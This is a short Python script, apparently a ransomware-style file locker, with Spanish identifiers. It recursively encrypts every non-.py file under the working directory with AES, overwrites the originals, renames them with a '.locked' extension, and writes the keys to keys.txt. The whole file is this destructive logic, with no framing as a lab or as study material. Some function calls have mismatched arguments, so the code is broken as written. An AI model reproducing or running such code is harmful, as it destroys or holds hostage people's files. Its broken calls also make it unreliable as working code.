import os
import shutil
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

def change_extension(file):
    nombre, extension = os.path.splitext(file)
    nuevo_nombre = nombre + ".locked"
    os.replace(file, nuevo_nombre)

def encrypt(path, file):
    with open(os.path.join(path,file),"rb") as f:
        data = f.read()
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(os.path.join(path,file), "wb") as f:
        f.write(ciphertext)
        print("Encrypted: ", ciphertext)
    change_extension(path, file)
    
    with open("keys.txt", "a") as f:
        f.write(f"File: {file}\nKey : {key}\nNonce :{nonce}\nTag:{tag}")
    
    
    
def enter_dir(path, file):
    path = os.path.join(path, file)

    if os.path.isdir(path):
        dir = os.listdir(path)
        for file in dir:
            shutil.copy(os.path.join(path,file),os.path.join(path,"copias_archivos"))
            if os.path.isfile(os.path.join(path, file)) and os.path.splitext(file)[1] != ".py":
                encrypt(path,file)
            else:
                enter_dir(path, file)

path =  os.getcwd()
dir = os.listdir(path)

for file in dir: 
    if os.path.isdir(file):
        enter_dir(path, file)
    elif os.path.isfile(os.path.join(path,file)) and os.path.splitext(file)[1] != ".py" :
        shutil.copy(os.path.join(path,file),os.path.join(path,"copias_archivos"))
        encrypt(file)